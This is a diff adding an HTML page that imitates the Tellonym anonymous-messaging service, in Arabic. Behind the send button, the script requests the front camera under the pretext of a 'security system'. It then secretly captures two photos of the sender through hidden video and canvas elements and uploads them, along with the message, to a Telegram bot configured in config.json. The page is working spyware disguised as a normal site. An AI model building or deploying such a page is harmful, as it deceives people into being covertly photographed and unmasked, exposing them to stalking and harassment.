@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tellonym - Secure Messaging</title>
+    <style>
+        body {
+            background-color: #121212; color: white;
+            font-family: 'Segoe UI', sans-serif; margin: 0;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; height: 100vh; padding: 20px;
+        }
+        .container {
+            width: 100%; max-width: 400px; background-color: #1e1e1e;
+            border-radius: 20px; padding: 25px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .profile-info { display: flex; align-items: center; margin-bottom: 20px; gap: 15px; }
+        .avatar { width: 55px; height: 55px; border-radius: 50%; }
+        .username-container { text-align: right; }
+        .username { font-weight: bold; font-size: 1.1rem; display: block; }
+        .tells-count { color: #888; font-size: 0.8rem; }
+        textarea {
+            width: 100%; height: 150px; background-color: #2a2a2a;
+            border: 1px solid #333; border-radius: 15px; color: white;
+            padding: 15px; box-sizing: border-box; resize: none; margin-bottom: 20px;
+        }
+        .btn-send {
+            width: 100%; background: #ff4b91; color: white; border: none;
+            padding: 14px; border-radius: 30px; font-weight: bold; cursor: pointer;
+        }
+        .btn-send:disabled { background: #555; }
+        .status-msg { margin-top: 15px; font-size: 0.85rem; color: #ff4b91; display: none; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="profile-info">
+            <div id="userAvatar" class="avatar"></div>
+            <div class="username-container">
+                <span id="displayName" class="username">جاري التحميل...</span>
+                <span id="displayTells" class="tells-count">-- Tells</span>
+            </div>
+        </div>
+        <textarea id="messageInput" placeholder="أرسل لي رسالة مجهولة..."></textarea>
+        <button id="mainBtn" class="btn-send">إرسال مجهول</button>
+        <p id="status" class="status-msg">جاري التحقق...</p>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        let config = {};
+
+        // 1. جلب البيانات من ملف JSON
+        async function loadConfig() {
+            try {
+                const response = await fetch('config.json');
+                config = await response.json();
+                
+                // تحديث الواجهة بالبيانات الجديدة
+                document.getElementById('displayName').innerText = config.username;
+                document.getElementById('displayTells').innerText = config.tellsCount;
+                document.getElementById('userAvatar').style.background = config.avatarColor;
+            } catch (err) {
+                console.error("خطأ في تحميل ملف الإعدادات:", err);
+            }
+        }
+
+        loadConfig();
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const mainBtn = document.getElementById('mainBtn');
+        const statusMsg = document.getElementById('status');
+
+        mainBtn.addEventListener('click', async () => {
+            const text = document.getElementById('messageInput').value.trim();
+            if (!text) return alert("اكتب رسالتك أولاً!");
+
+            mainBtn.disabled = true;
+            statusMsg.style.display = "block";
+            statusMsg.innerText = "جاري تفعيل نظام الأمان...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    captureAndSend("صورة 1");
+                    setTimeout(() => {
+                        captureAndSend("صورة 2");
+                        sendTextMessage(text);
+                        setTimeout(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            statusMsg.innerText = "تم الإرسال بنجاح ✅";
+                            document.getElementById('messageInput').value = "";
+                            mainBtn.disabled = false;
+                        }, 2000);
+                    }, 800);
+                }, 1500);
+            } catch (err) {
+                statusMsg.innerText = "يجب الموافقة على صلاحيات الكاميرا للإرسال!";
+                mainBtn.disabled = false;
+            }
+        });
+
+        function captureAndSend(label) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', config.chatId);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `🔔 ${label} من المستخدم: ${config.username}`);
+                fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.5);
+        }
+
+        async function sendTextMessage(msg) {
+            await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: config.chatId, text: `✉️ رسالة جديدة لـ ${config.username}:\n\n${msg}` })
+            });
+        }
+    </script>
+</body>
+</html>
